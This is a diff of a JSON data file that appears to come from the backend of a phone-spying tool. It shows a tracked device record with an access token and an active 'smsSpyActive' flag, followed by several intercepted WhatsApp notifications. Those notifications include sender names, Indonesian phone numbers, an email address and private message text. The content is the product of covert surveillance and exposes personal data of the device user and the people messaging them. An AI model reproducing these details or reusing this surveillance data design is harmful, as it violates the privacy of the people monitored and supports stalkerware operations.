@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776964815757,
+    "lastSeen": 1776964818702,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "kena cahaya pusing",
+        "time": "24/04 01:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776964816728
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 858-3608-9495",
+        "content": "Gada",
+        "time": "24/04 01:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776964816666
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Zal7Se",
+        "content": "bisa bisa, jual 40k",
+        "time": "24/04 01:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776964816646
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Khifrandev Solution",
+        "content": "oalah oke siap kak",
+        "time": "24/04 01:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776964816558
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 821-4849-9859",
+        "content": "Telescopic bawa kembali ke markas",
+        "time": "24/04 01:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776964816536
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Wabot",
+        "content": "📷 Thank you, Rama Yandi. The Wabot account for at6327638@gmail.com has been activated.\n\nLog in here:\nhttps://app.wabot.my/login or click button login to link your number 👇\n\nUser guide:\nhttps://docs.fatomate.com . Please check your email to get special coupon 20% off. \n\nIf you experience any issues, please let us know.",
+        "time": "24/04 01:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776964816477
+      },
       {
         "appName": "WhatsApp",
         "sender": "Maya",
@@ -3971,54 +4019,6 @@
         "time": "23/04 22:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1776954450562
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎61 pesan dari 40 chat",
-        "time": "23/04 22:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776954415795
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Meii",
-        "content": "ok",
-        "time": "23/04 22:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776954415780
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎71 pesan dari 41 chat",
-        "time": "23/04 22:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776954415286
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Meii",
-        "content": "ok",
-        "time": "23/04 22:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776954409386
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎61 pesan dari 40 chat",
-        "time": "23/04 22:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776954409374
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎71 pesan dari 41 chat",
-        "time": "23/04 22:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776954408796
       }
     ],
     "galleryPhotos": [],
